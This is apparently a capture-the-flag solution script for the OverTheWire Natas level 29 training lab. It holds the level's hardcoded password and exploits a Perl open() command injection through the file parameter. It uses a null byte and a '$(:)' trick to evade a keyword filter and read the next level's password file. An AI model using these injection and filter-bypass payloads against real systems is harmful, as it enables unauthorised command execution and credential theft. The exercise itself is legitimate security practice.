import requests

level = 'natas29'
url = 'http://{}.natas.labs.overthewire.org'.format(level)
username = 'natas29'
password = 'pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno'

session = requests.Session()
session.auth = (username, password)

# Exploit the Perl's open() function to execute shell commands
# Use mode "|-" to read the command from where the output will be piped to.
# Terminate the string with "%00" in URL encoding to avoid additional filtering.
response = session.get(url + '/index.pl?file=|whoami%00')
print(response.text)

# Retrieve the password for the next level by reading the content of /etc/natas_webpass/natas30 file
# Use "$(:)" to bypass the additional filtering for the word "natas"
response = session.get(url + '/index.pl?file=|cat /etc/nat$(:)as_webpass/nat$(:)as30%00')
print(response.text)
